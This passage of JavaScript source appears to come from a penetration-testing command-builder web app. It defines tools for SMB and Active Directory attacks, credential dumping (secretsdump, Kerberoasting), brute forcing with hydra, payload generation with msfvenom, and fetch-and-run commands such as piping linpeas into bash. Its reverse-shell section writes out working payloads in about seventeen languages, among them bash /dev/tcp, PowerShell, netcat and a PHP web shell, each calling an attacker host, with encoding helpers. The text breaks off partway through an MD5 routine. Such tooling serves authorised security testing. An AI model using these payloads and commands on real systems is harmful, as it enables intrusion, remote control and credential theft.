  { id:'smbclient',label:'smbclient',category:'smb-ad',description:'SMB share enumeration and access',install:'sudo apt install smbclient',referenceUrl:'https://www.samba.org/samba/docs/current/man-html/smbclient.1.html',
    params:[{id:'target',label:'Target IP',type:'text',autoFill:'ip',placeholder:'10.10.10.x'},{id:'share',label:'Share Name',type:'text',default:'',placeholder:'SYSVOL (blank=list)'},{id:'user',label:'Username',type:'text',default:'',placeholder:'anonymous'},{id:'pass',label:'Password',type:'text',default:'',placeholder:'(blank for anon)'}],
    buildCommand(p){const creds=p.user?`-U "${p.user}%${p.pass||''}"`:'-N';return p.share?`smbclient //${p.target}/${p.share} ${creds}`:`smbclient -L //${p.target} ${creds}`;}},
  { id:'enum4linux',label:'enum4linux',category:'smb-ad',description:'SMB/LDAP enumeration',install:'sudo apt install enum4linux',referenceUrl:'https://github.com/CiscoCXSecurity/enum4linux',
    params:[{id:'target',label:'Target IP',type:'text',autoFill:'ip',placeholder:'10.10.10.x'},{id:'mode',label:'Mode',type:'select',default:'-a',options:['-a','-u','-g','-s','-p','-r']}],
    buildCommand(p){return `enum4linux ${p.mode||'-a'} ${p.target}`;}},
  { id:'crackmapexec',label:'crackmapexec',category:'smb-ad',description:'SMB/AD Swiss army knife',install:'sudo apt install crackmapexec',referenceUrl:'https://github.com/Porchetta-Industries/CrackMapExec',
    params:[{id:'target',label:'Target IP/Range',type:'text',autoFill:'ip',placeholder:'10.10.10.x'},{id:'proto',label:'Protocol',type:'select',default:'smb',options:['smb','winrm','rdp','ldap','mssql']},{id:'user',label:'Username',type:'text',default:'',placeholder:'administrator'},{id:'pass',label:'Password/Hash',type:'text',default:'',placeholder:'password'},{id:'action',label:'Action',type:'select',default:'--shares',options:['--shares','--users','--groups','--pass-pol','--sam','--lsa','--ntds']}],
    buildCommand(p){const creds=p.user?`-u "${p.user}" -p "${p.pass||''}"`:''  ;return `crackmapexec ${p.proto||'smb'} ${p.target} ${creds} ${p.action||''}`.trim().replace(/\s+/g,' ');}},
  { id:'impacket-secretsdump',label:'secretsdump',category:'smb-ad',description:'Dump SAM/NTDS hashes',install:'sudo apt install python3-impacket',referenceUrl:'https://github.com/fortra/impacket',
    params:[{id:'domain',label:'Domain',type:'text',default:'',placeholder:'CORP.LOCAL'},{id:'user',label:'Username',type:'text',default:'',placeholder:'administrator'},{id:'pass',label:'Password',type:'text',default:'',placeholder:'P@ssword1'},{id:'target',label:'DC IP',type:'text',autoFill:'ip',placeholder:'10.10.10.x'}],
    buildCommand(p){return `impacket-secretsdump ${p.domain||'WORKGROUP'}/${p.user}:${p.pass}@${p.target}`;}},
  { id:'impacket-psexec',label:'psexec (impacket)',category:'smb-ad',description:'Remote code execution via SMB',install:'sudo apt install python3-impacket',referenceUrl:'https://github.com/fortra/impacket',
    params:[{id:'domain',label:'Domain',type:'text',default:'.',placeholder:'CORP.LOCAL or .'},{id:'user',label:'Username',type:'text',default:'',placeholder:'administrator'},{id:'pass',label:'Password',type:'text',default:'',placeholder:'P@ssword1'},{id:'target',label:'Target IP',type:'text',autoFill:'ip',placeholder:'10.10.10.x'}],
    buildCommand(p){return `impacket-psexec ${p.domain||'.'}/${p.user}:${p.pass}@${p.target}`;}},
  { id:'bloodhound',label:'bloodhound-python',category:'smb-ad',description:'AD attack path data collection',install:'pip3 install bloodhound',referenceUrl:'https://github.com/fox-it/BloodHound.py',
    params:[{id:'user',label:'Username',type:'text',default:'',placeholder:'user'},{id:'pass',label:'Password',type:'text',default:'',placeholder:'password'},{id:'domain',label:'Domain',type:'text',default:'',placeholder:'CORP.LOCAL'},{id:'dc',label:'DC IP',type:'text',autoFill:'ip',placeholder:'10.10.10.x'}],
    buildCommand(p){return `bloodhound-python -u ${p.user} -p '${p.pass}' -d ${p.domain} -dc ${p.dc} -c all --zip`;}},
  { id:'kerberoast',label:'GetUserSPNs (Kerberoast)',category:'smb-ad',description:'Kerberoasting — request TGS tickets',install:'sudo apt install python3-impacket',referenceUrl:'https://github.com/fortra/impacket',
    params:[{id:'domain',label:'Domain',type:'text',default:'',placeholder:'CORP.LOCAL'},{id:'user',label:'Username',type:'text',default:'',placeholder:'user'},{id:'pass',label:'Password',type:'text',default:'',placeholder:'password'},{id:'dc',label:'DC IP',type:'text',autoFill:'ip',placeholder:'10.10.10.x'}],
    buildCommand(p){return `impacket-GetUserSPNs ${p.domain}/${p.user}:${p.pass} -dc-ip ${p.dc} -request -outputfile kerberoast.hash`;}},
  { id:'asrep',label:'GetNPUsers (AS-REP)',category:'smb-ad',description:'AS-REP Roasting',install:'sudo apt install python3-impacket',referenceUrl:'https://github.com/fortra/impacket',
    params:[{id:'domain',label:'Domain',type:'text',default:'',placeholder:'CORP.LOCAL'},{id:'dc',label:'DC IP',type:'text',autoFill:'ip',placeholder:'10.10.10.x'},{id:'usersfile',label:'Users File',type:'text',default:'users.txt',placeholder:'users.txt'}],
    buildCommand(p){return `impacket-GetNPUsers ${p.domain}/ -usersfile ${p.usersfile} -dc-ip ${p.dc} -no-pass -format hashcat`;}},
  { id:'evil-winrm',label:'evil-winrm',category:'smb-ad',description:'WinRM shell (PowerShell remoting)',install:'gem install evil-winrm',referenceUrl:'https://github.com/Hackplayers/evil-winrm',
    params:[{id:'target',label:'Target IP',type:'text',autoFill:'ip',placeholder:'10.10.10.x'},{id:'user',label:'Username',type:'text',default:'',placeholder:'administrator'},{id:'pass',label:'Password',type:'text',default:'',placeholder:'password'},{id:'hash',label:'NT Hash (optional)',type:'text',default:'',placeholder:'optional NTLM hash'}],
    buildCommand(p){return p.hash?`evil-winrm -i ${p.target} -u ${p.user} -H ${p.hash}`:`evil-winrm -i ${p.target} -u ${p.user} -p '${p.pass}'`;}},
  // AUTH
  { id:'hydra',label:'hydra',category:'auth',description:'Network brute force tool',install:'sudo apt install hydra',referenceUrl:'https://github.com/vanhauser-thc/thc-hydra',
    params:[{id:'target',label:'Target IP',type:'text',autoFill:'ip',placeholder:'10.10.10.x'},{id:'service',label:'Service',type:'select',default:'ssh',options:['ssh','ftp','smb','rdp','http-post-form','mysql','mssql','vnc','telnet','pop3','smtp']},{id:'user',label:'Username/File',type:'text',default:'admin',placeholder:'admin or users.txt'},{id:'wordlist',label:'Password Wordlist',type:'text',default:'/usr/share/wordlists/rockyou.txt',placeholder:'rockyou.txt'},{id:'threads',label:'Threads',type:'text',default:'16',placeholder:'16'},{id:'extra',label:'Extra (http-post-form)',type:'text',default:'',placeholder:'/login:user=^USER^&pass=^PASS^:Invalid'}],
    buildCommand(p){const uf=p.user&&p.user.endsWith('.txt')?`-L ${p.user}`:`-l ${p.user}`;return `hydra -t ${p.threads||16} ${uf} -P ${p.wordlist} ${p.service} ${p.target}${p.extra&&p.service==='http-post-form'?' "'+p.extra+'"':''}`.trim();}},
  { id:'john',label:'john',category:'auth',description:'John the Ripper hash cracker',install:'sudo apt install john',referenceUrl:'https://www.openwall.com/john/',
    params:[{id:'hashfile',label:'Hash File',type:'text',default:'hash.txt',placeholder:'hashes.txt'},{id:'wordlist',label:'Wordlist',type:'text',default:'/usr/share/wordlists/rockyou.txt',placeholder:'rockyou.txt'},{id:'format',label:'Format',type:'text',default:'',placeholder:'NT, md5crypt (optional)'},{id:'rules',label:'Rules',type:'text',default:'',placeholder:'best64 (optional)'}],
    buildCommand(p){return `john ${p.hashfile} --wordlist=${p.wordlist} ${p.format?`--format=${p.format}`:''} ${p.rules?`--rules=${p.rules}`:''}`.trim().replace(/\s+/g,' ');}},
  { id:'hashcat',label:'hashcat',category:'auth',description:'GPU-accelerated hash cracker',install:'sudo apt install hashcat',referenceUrl:'https://hashcat.net/wiki/',
    params:[{id:'hashfile',label:'Hash File',type:'text',default:'hash.txt',placeholder:'hash.txt'},{id:'mode',label:'Mode (-m)',type:'text',default:'0',placeholder:'0=MD5, 1000=NTLM, 1800=sha512crypt'},{id:'wordlist',label:'Wordlist',type:'text',default:'/usr/share/wordlists/rockyou.txt',placeholder:'rockyou.txt'},{id:'rules',label:'Rules File',type:'text',default:'',placeholder:'best64.rule (optional)'},{id:'attack',label:'Attack Mode',type:'select',default:'0',options:['0 (dictionary)','3 (brute force)','6 (hybrid)']}],
    buildCommand(p){return `hashcat -a ${p.attack?p.attack.split(' ')[0]:'0'} -m ${p.mode||0} ${p.hashfile} ${p.wordlist} ${p.rules?`-r ${p.rules}`:''} --force`.trim().replace(/\s+/g,' ');}},
  // EXPLOIT
  { id:'searchsploit',label:'searchsploit',category:'exploit',description:'Exploit-DB offline search',install:'sudo apt install exploitdb',referenceUrl:'https://www.exploit-db.com',
    params:[{id:'query',label:'Search Query',type:'text',default:'',placeholder:'Apache 2.4.49'},{id:'flags',label:'Flags',type:'text',default:'',placeholder:'--www -t'}],
    buildCommand(p){return `searchsploit ${p.flags||''} "${p.query}"`.trim();}},
  { id:'msfvenom',label:'msfvenom',category:'exploit',description:'Payload generator',install:'sudo apt install metasploit-framework',referenceUrl:'https://docs.metasploit.com',
    params:[{id:'payload',label:'Payload',type:'select',default:'linux/x64/shell_reverse_tcp',options:['linux/x64/shell_reverse_tcp','linux/x64/meterpreter/reverse_tcp','windows/x64/shell_reverse_tcp','windows/x64/meterpreter/reverse_tcp','php/reverse_php','java/jsp_shell_reverse_tcp']},{id:'lhost',label:'LHOST',type:'text',default:'',placeholder:'10.10.14.x'},{id:'lport',label:'LPORT',type:'text',default:'4444',placeholder:'4444'},{id:'format',label:'Format',type:'select',default:'elf',options:['elf','exe','raw','war','jar','php','asp','aspx','ps1','py']},{id:'output',label:'Output File',type:'text',default:'shell',placeholder:'shell'}],
    buildCommand(p){const exts={elf:'',exe:'.exe',php:'.php',asp:'.asp',aspx:'.aspx',ps1:'.ps1',py:'.py',war:'.war',jar:'.jar'};return `msfvenom -p ${p.payload} LHOST=${p.lhost} LPORT=${p.lport||4444} -f ${p.format} -o ${p.output||'shell'}${exts[p.format]||''}`;}},
  // POST-EXPLOIT
  { id:'linpeas',label:'linpeas',category:'post',description:'Linux privilege escalation enumeration',install:'curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh',referenceUrl:'https://github.com/peass-ng/PEASS-ng',
    params:[{id:'lhost',label:'Your IP',type:'text',default:'',placeholder:'10.10.14.x'},{id:'method',label:'Method',type:'select',default:'curl',options:['curl','wget','python3 server']}],
    buildCommand(p){if(p.method==='wget')return `wget http://${p.lhost}/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh`;if(p.method==='python3 server')return `# Your machine:\npython3 -m http.server 80\n# Target:\ncurl http://${p.lhost}/linpeas.sh | bash`;return `curl http://${p.lhost}/linpeas.sh | bash`;}},
  { id:'winpeas',label:'winpeas',category:'post',description:'Windows privilege escalation enumeration',install:'Download from: https://github.com/peass-ng/PEASS-ng/releases',referenceUrl:'https://github.com/peass-ng/PEASS-ng',
    params:[{id:'lhost',label:'Your IP',type:'text',default:'',placeholder:'10.10.14.x'}],
    buildCommand(p){return `.\\winPEAS.exe\n\n# Transfer via impacket SMB server:\n# Your machine: impacket-smbserver share . -smb2support\n# Target: \\\\${p.lhost||'YOUR_IP'}\\share\\winPEAS.exe`;}},
  { id:'pwncat',label:'pwncat',category:'post',description:'Fancy reverse shell handler with post-exploit modules',install:'pip3 install pwncat-cs',referenceUrl:'https://pwncat.readthedocs.io',
    params:[{id:'port',label:'Listen Port',type:'text',default:'4444',placeholder:'4444'}],
    buildCommand(p){return `pwncat-cs -lp ${p.port||4444}`;}},
  // NET
  { id:'netcat',label:'netcat',category:'net',description:'Swiss army knife of networking',install:'sudo apt install netcat-openbsd',referenceUrl:'https://man.openbsd.org/nc.1',
    params:[{id:'mode',label:'Mode',type:'select',default:'listen',options:['listen','connect','port-scan','file-transfer-receive']},{id:'host',label:'Host/IP',type:'text',autoFill:'ip',placeholder:'10.10.10.x'},{id:'port',label:'Port',type:'text',default:'4444',placeholder:'4444'},{id:'file',label:'File (transfer)',type:'text',default:'',placeholder:'file.txt'}],
    buildCommand(p){switch(p.mode){case'listen':return `nc -lvnp ${p.port||4444}`;case'connect':return `nc ${p.host} ${p.port||4444}`;case'port-scan':return `nc -zv ${p.host} 1-65535 2>&1 | grep -i open`;case'file-transfer-receive':return `nc -lvnp ${p.port||4444} > ${p.file||'received_file'}`;default:return `nc -lvnp ${p.port||4444}`;}}},
  { id:'curl',label:'curl',category:'net',description:'HTTP requests and file transfer',install:'sudo apt install curl',referenceUrl:'https://curl.se/docs/',
    params:[{id:'url',label:'URL',type:'text',autoFill:'url',placeholder:'http://10.10.10.x/path'},{id:'method',label:'Method',type:'select',default:'GET',options:['GET','POST','PUT','DELETE','PATCH','HEAD']},{id:'data',label:'POST Data',type:'text',default:'',placeholder:'key=value'},{id:'headers',label:'Headers',type:'text',default:'',placeholder:'Content-Type: application/json'},{id:'output',label:'Output File',type:'text',default:'',placeholder:'output.html'}],
    buildCommand(p){return `curl -s ${p.method!=='GET'?`-X ${p.method}`:''} ${p.headers?`-H '${p.headers}'`:''} ${p.data?`-d '${p.data}'`:''} ${p.output?`-o ${p.output}`:''} '${p.url}'`.trim().replace(/\s+/g,' ');}},
  { id:'wget',label:'wget',category:'net',description:'File download from web',install:'sudo apt install wget',referenceUrl:'https://www.gnu.org/software/wget/manual/wget.html',
    params:[{id:'url',label:'URL',type:'text',autoFill:'url',placeholder:'http://10.10.10.x/file'},{id:'output',label:'Output File',type:'text',default:'',placeholder:'file.txt'}],
    buildCommand(p){return `wget ${p.output?`-O ${p.output}`:''} '${p.url}'`.trim();}},
  { id:'ssh',label:'ssh',category:'net',description:'SSH connection and tunnelling',install:'sudo apt install openssh-client',referenceUrl:'https://man.openbsd.org/ssh',
    params:[{id:'target',label:'Target IP',type:'text',autoFill:'ip',placeholder:'10.10.10.x'},{id:'user',label:'Username',type:'text',default:'',placeholder:'user'},{id:'port',label:'Port',type:'text',default:'22',placeholder:'22'},{id:'key',label:'Key File',type:'text',default:'',placeholder:'id_rsa'},{id:'mode',label:'Mode',type:'select',default:'connect',options:['connect','local-forward','remote-forward','dynamic-socks']},{id:'fwd',label:'Forward Ports',type:'text',default:'',placeholder:'8080:127.0.0.1:80'}],
    buildCommand(p){const base=`ssh ${p.key?`-i ${p.key}`:''} -p ${p.port||22} ${p.user}@${p.target}`.trim().replace(/\s+/g,' ');switch(p.mode){case'local-forward':return `${base} -L ${p.fwd||'8080:127.0.0.1:80'} -N`;case'remote-forward':return `${base} -R ${p.fwd||'8080:127.0.0.1:80'} -N`;case'dynamic-socks':return `${base} -D ${p.fwd||'1080'} -N -q`;default:return base;}}},
  { id:'ftp',label:'ftp',category:'net',description:'FTP client (anon login & download)',install:'sudo apt install ftp',referenceUrl:'https://linux.die.net/man/1/ftp',
    params:[{id:'target',label:'Target IP',type:'text',autoFill:'ip',placeholder:'10.10.10.x'}],
    buildCommand(p){return `ftp ${p.target}\n# At prompt: anonymous / anonymous\n# Commands: ls, get <file>, mget *, bye`;}},
  // OSINT
  { id:'theharvester',label:'theHarvester',category:'osint',description:'Email/hostname/IP harvesting',install:'sudo apt install theharvester',referenceUrl:'https://github.com/laramies/theHarvester',
    params:[{id:'domain',label:'Domain',type:'text',default:'',placeholder:'example.com'},{id:'sources',label:'Sources',type:'text',default:'all',placeholder:'google,bing,shodan'},{id:'limit',label:'Result Limit',type:'text',default:'500',placeholder:'500'}],
    buildCommand(p){return `theHarvester -d ${p.domain} -b ${p.sources||'all'} -l ${p.limit||500}`;}},
  { id:'sherlock',label:'sherlock',category:'osint',description:'Username search across social platforms',install:'pip3 install sherlock-project',referenceUrl:'https://github.com/sherlock-project/sherlock',
    params:[{id:'username',label:'Username',type:'text',default:'',placeholder:'target_username'}],
    buildCommand(p){return `sherlock ${p.username} --print-found`;}},
  { id:'whois',label:'whois',category:'osint',description:'Domain registration lookup',install:'sudo apt install whois',referenceUrl:'https://www.whois.net',
    params:[{id:'target',label:'Domain or IP',type:'text',autoFill:'ip',placeholder:'example.com'}],
    buildCommand(p){return `whois ${p.target}`;}},
  { id:'dig',label:'dig',category:'osint',description:'DNS lookup tool',install:'sudo apt install dnsutils',referenceUrl:'https://linux.die.net/man/1/dig',
    params:[{id:'target',label:'Domain/IP',type:'text',autoFill:'ip',placeholder:'example.com'},{id:'type',label:'Record Type',type:'select',default:'ANY',options:['ANY','A','AAAA','MX','NS','TXT','CNAME','SOA','PTR','AXFR']},{id:'server',label:'DNS Server',type:'text',default:'',placeholder:'8.8.8.8 (optional)'}],
    buildCommand(p){return `dig ${p.server?`@${p.server}`:''} ${p.target} ${p.type||'ANY'}`.trim();}},
  { id:'exiftool',label:'exiftool',category:'osint',description:'Extract metadata from files',install:'sudo apt install libimage-exiftool-perl',referenceUrl:'https://exiftool.org',
    params:[{id:'file',label:'File',type:'text',default:'',placeholder:'image.jpg or *.pdf'}],
    buildCommand(p){return `exiftool ${p.file}`;}},
  { id:'shodan-cli',label:'shodan CLI',category:'osint',description:'Shodan search from command line',install:'pip3 install shodan && shodan init <API_KEY>',referenceUrl:'https://cli.shodan.io',
    params:[{id:'query',label:'Search Query',type:'text',default:'',placeholder:'apache country:US'},{id:'target',label:'Target IP (host info)',type:'text',autoFill:'ip',placeholder:'leave blank for search'}],
    buildCommand(p){return (p.target&&!p.query)?`shodan host ${p.target}`:`shodan search "${p.query}"`;}},
  // MISC
  { id:'openssl',label:'openssl',category:'misc',description:'SSL/TLS testing, cert inspection',install:'sudo apt install openssl',referenceUrl:'https://www.openssl.org/docs/',
    params:[{id:'mode',label:'Mode',type:'select',default:'s_client',options:['s_client','genrsa','req -x509','dgst -sha256','base64']},{id:'target',label:'Target',type:'text',autoFill:'url',placeholder:'example.com:443 or filename'}],
    buildCommand(p){switch(p.mode){case's_client':return `echo "" | openssl s_client -connect ${p.target} -showcerts 2>/dev/null | openssl x509 -noout -text`;case'genrsa':return `openssl genrsa -out private.pem 2048`;case'req -x509':return `openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes`;case'dgst -sha256':return `openssl dgst -sha256 ${p.target}`;case'base64':return `openssl base64 -in ${p.target} -out ${p.target}.b64`;default:return `openssl ${p.mode} ${p.target}`;}}},
  { id:'python-server',label:'Python HTTP Server',category:'misc',description:'Serve files for target download',install:'Built-in (python3)',referenceUrl:'https://docs.python.org/3/library/http.server.html',
    params:[{id:'port',label:'Port',type:'text',default:'80',placeholder:'80'}],
    buildCommand(p){return `python3 -m http.server ${p.port||80}`;}},
  { id:'base64-cli',label:'base64 (CLI)',category:'misc',description:'Encode/decode base64 in shell',install:'Built-in',referenceUrl:'https://linux.die.net/man/1/base64',
    params:[{id:'mode',label:'Mode',type:'select',default:'encode',options:['encode','decode']},{id:'input',label:'Input String/File',type:'text',default:'',placeholder:'"string" or filename'}],
    buildCommand(p){return p.mode==='decode'?`echo "${p.input}" | base64 -d`:`echo -n "${p.input}" | base64`;}},
];

// ═══════════════════════════════════════════════════════════════════════════════
// SECTION 1F — REVERSE SHELL  (from reverseshell.js)
// ═══════════════════════════════════════════════════════════════════════════════

const SHELL_LANGUAGES = [
  {id:'bash',label:'Bash'},{id:'python2',label:'Python 2'},{id:'python3',label:'Python 3'},
  {id:'php',label:'PHP'},{id:'powershell',label:'PowerShell'},{id:'perl',label:'Perl'},
  {id:'ruby',label:'Ruby'},{id:'java',label:'Java'},{id:'golang',label:'Golang'},
  {id:'nodejs',label:'Node.js'},{id:'socat',label:'Socat'},{id:'awk',label:'Awk'},
  {id:'lua',label:'Lua'},{id:'nc',label:'Netcat'},{id:'ncat',label:'Ncat'},
  {id:'busybox',label:'BusyBox nc'},{id:'telnet',label:'Telnet'},
];

function generateShell(lang, ip, port) {
  const p = port || 4444;
  const i = ip || 'LHOST';
  const shells = {
    bash:       { payload:`bash -i >& /dev/tcp/${i}/${p} 0>&1`, payloadAlt:`bash -c 'bash -i >& /dev/tcp/${i}/${p} 0>&1'`, note:'Standard bash TCP redirect. If first fails, try second.' },
    python2:    { payload:`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${i}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`, note:'Python 2 using subprocess.' },
    python3:    { payload:`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${i}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`, payloadAlt:`python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("${i}",${p}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("bash")'`, note:'Second form spawns a PTY — more stable shell.' },
    php:        { payload:`php -r '$sock=fsockopen("${i}",${p});exec("/bin/sh -i <&3 >&3 2>&3");'`, payloadAlt:`<?php system("bash -c 'bash -i >& /dev/tcp/${i}/${p} 0>&1'"); ?>`, note:'First is one-liner. Second is a web shell (.php file).' },
    powershell: { payload:`powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${i}',${p});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`, note:'Full PowerShell reverse shell with interactive prompt.' },
    perl:       { payload:`perl -e 'use Socket;$i="${i}";$p=${p};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`, note:'Perl reverse shell using Socket module.' },
    ruby:       { payload:`ruby -rsocket -e'f=TCPSocket.open("${i}",${p}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`, payloadAlt:`ruby -rsocket -e 'exit if fork;c=TCPSocket.new("${i}","${p}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`, note:'Second form forks for stability.' },
    java:       { payload:`r = Runtime.getRuntime()\np = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/${i}/${p};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[])\np.waitFor()`, note:'Java Groovy-style runtime execution.' },
    golang:     { payload:`package main\nimport("net";"os/exec";"time")\nfunc main(){\n  c,_:=net.Dial("tcp","${i}:${p}")\n  for{\n    cmd:=exec.Command("/bin/sh")\n    cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c\n    cmd.Run()\n    time.Sleep(time.Second)\n  }\n}`, note:'Compile and run on target.' },
    nodejs:     { payload:`(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect(${p},"${i}",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();`, note:'Node.js reverse shell using net module.' },
    socat:      { payload:`socat TCP:${i}:${p} EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane`, payloadAlt:`socat TCP4-LISTEN:${p},reuseaddr,fork EXEC:/bin/bash`, note:'Socat gives a proper PTY. First=connect, second=listen.' },
    awk:        { payload:`awk 'BEGIN {s = "/inet/tcp/0/${i}/${p}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}'`, note:'Awk reverse shell — useful when other methods blocked.' },
    lua:        { payload:`lua -e "require('socket');require('os');t=socket.tcp();t:connect('${i}','${p}');os.execute('/bin/sh -i <&3 >&3 2>&3');"`, note:'Lua reverse shell using socket library.' },
    nc:         { payload:`nc -e /bin/sh ${i} ${p}`, payloadAlt:`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${i} ${p} >/tmp/f`, note:'First works with nc -e. Second is mkfifo method for restricted nc.' },
    ncat:       { payload:`ncat ${i} ${p} -e /bin/bash`, payloadAlt:`ncat ${i} ${p} --ssl -e /bin/bash`, note:'Ncat supports --ssl for encrypted shell.' },
    busybox:    { payload:`busybox nc ${i} ${p} -e /bin/sh`, note:'BusyBox nc for minimal systems (containers, IoT).' },
    telnet:     { payload:`TF=$(mktemp -u);mkfifo $TF && telnet ${i} ${p} 0<$TF | /bin/sh 1>$TF`, note:'Telnet-based shell using named pipe.' },
  };
  const s = shells[lang] || shells.bash;
  return {
    payload: s.payload,
    payloadAlt: s.payloadAlt || null,
    listener: `nc -lvnp ${p}`,
    stabilise: `# Shell stabilisation (Linux)\npython3 -c 'import pty;pty.spawn("/bin/bash")'\n# Then: Ctrl+Z\nstty raw -echo; fg\nexport TERM=xterm; stty rows 40 cols 160`,
    note: s.note || '',
    lang,
  };
}

function encodeShell(payload, encoding) {
  switch(encoding) {
    case 'base64': return btoa(unescape(encodeURIComponent(payload)));
    case 'url':    return encodeURIComponent(payload);
    default:       return payload;
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
// SECTION 1G — ENCODER  (from encoder.js — browser-compatible)
// ═══════════════════════════════════════════════════════════════════════════════

function _rot13(s) {
  return s.replace(/[a-zA-Z]/g, c => {
    const b = c <= 'Z' ? 65 : 97;
    return String.fromCharCode(((c.charCodeAt(0) - b + 13) % 26) + b);
  });
}
function _htmlEncode(s) { return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#x27;'); }
function _htmlDecode(s) { const t=document.createElement('textarea'); t.innerHTML=s; return t.value; }

// MD5 pure JS
function _md5(input) {
  function safeAdd(x,y){const l=(x&0xFFFF)+(y&0xFFFF);return ((x>>16)+(y>>16)+(l>>16))<<16|l&0xFFFF;}
  function brl(n,c){return n<<c|n>>>32-c;}
  function ff(a,b,c,d,x,s,t){return safeAdd(brl(safeAdd(safeAdd(a,b&c|~b&d),safeAdd(x,t)),s),b);}
  function gg(a,b,c,d,x,s,t){return safeAdd(brl(safeAdd(safeAdd(a,b&d|c&~d),safeAdd(x,t)),s),b);}
  function hh(a,b,c,d,x,s,t){return safeAdd(brl(safeAdd(safeAdd(a,b^c^d),safeAdd(x,t)),s),b);}
  function ii(a,b,c,d,x,s,t){return safeAdd(brl(safeAdd(safeAdd(a,c^(b|~d)),safeAdd(x,t)),s),b);}
  function blk(s){const m=[];for(let i=0;i<64;i+=4)m[i>>2]=s.charCodeAt(i)+(s.charCodeAt(i+1)<<8)+(s.charCodeAt(i+2)<<16)+(s.charCodeAt(i+3)<<24);return m;}
  function cycle(x,k){
    let[a,b,c,d]=x;
    a=ff(a,b,c,d,k[0],7,-680876936);d=ff(d,a,b,c,k[1],12,-389564586);c=ff(c,d,a,b,k[2],17,606105819);b=ff(b,c,d,a,k[3],22,-1044525330);
    a=ff(a,b,c,d,k[4],7,-176418897);d=ff(d,a,b,c,k[5],12,1200080426);c=ff(c,d,a,b,k[6],17,-1473231341);b=ff(b,c,d,a,k[7],22,-45705983);
    a=ff(a,b,c,d,k[8],7,1770035416);d=ff(d,a,b,c,k[9],12,-1958414417);c=ff(c,d,a,b,k[10],17,-42063);b=ff(b,c,d,a,k[11],22,-1990404162);
    a=ff(a,b,c,d,k[12],7,1804603682);d=ff(d,a,b,c,k[13],12,-40341101);c=ff(c,d,a,b,k[14],17,-1502002290);b=ff(b,c,d,a,k[15],22,1236535329);
    a=gg(a,b,c,d,k[1],5,-165796510);d=gg(d,a,b,c,k[6],9,-1069501632);c=gg(c,d,a,b,k[11],14,643717713);b=gg(b,c,d,a,k[0],20,-373897302);
    a=gg(a,b,c,d,k[5],5,-701558691);d=gg(d,a,b,c,k[10],9,38016083);c=gg(c,d,a,b,k[15],14,-660478335);b=gg(b,c,d,a,k[4],20,-405537848);
    a=gg(a,b,c,d,k[9],5,568446438);d=gg(d,a,b,c,k[14],9,-1019803690);c=gg(c,d,a,b,k[3],14,-187363961);b=gg(b,c,d,a,k[8],20,1163531501);
    a=gg(a,b,c,d,k[13],5,-1444681467);d=gg(d,a,b,c,k[2],9,-51403784);c=gg(c,d,a,b,k[7],14,1735328473);b=gg(b,c,d,a,k[12],20,-1926607734);
    a=hh(a,b,c,d,k[5],4,-378558);d=hh(d,a,b,c,k[8],11,-2022574463);c=hh(c,d,a,b,k[11],16,1839030562);b=hh(b,c,d,a,k[14],23,-35309556);
    a=hh(a,b,c,d,k[1],4,-1530992060);d=hh(d,a,b,c,k[4],11,1272893353);c=hh(c,d,a,b,k[7],16,-155497632);b=hh(b,c,d,a,k[10],23,-1094730640);
    a=hh(a,b,c,d,k[13],4,681279174);d=hh(d,a,b,c,k[0],11,-358537222);c=hh(c,d,a,b,k[3],16,-722521979);b=hh(b,c,d,a,k[6],23,76029189);
    a=hh(a,b,c,d,k[9],4,-640364487);d=hh(d,a,b,c,k[12],11,-421815835);c=hh(c,d,a,b,k[15],16,530742520);b=hh(b,c,d,a,k[2],23,-995338651);
    a=ii(a,b,c,d,k[0],6,-198630844);d=ii(d,a,b,c,k[7],10,1126891415);c=ii(c,d,a,b,k[14],15,-1416354905);b=ii(b,c,d,a,k[5],21,-57434055);
    a=ii(a,b,c,d,k[12],6,1700485571);d=ii(d,a,b,c,k[3],10,-1894986606);c=ii(c,d,a,b,k[10],15,-1051523);b=ii(b,c,d,a,k[1],21,-2054922799);
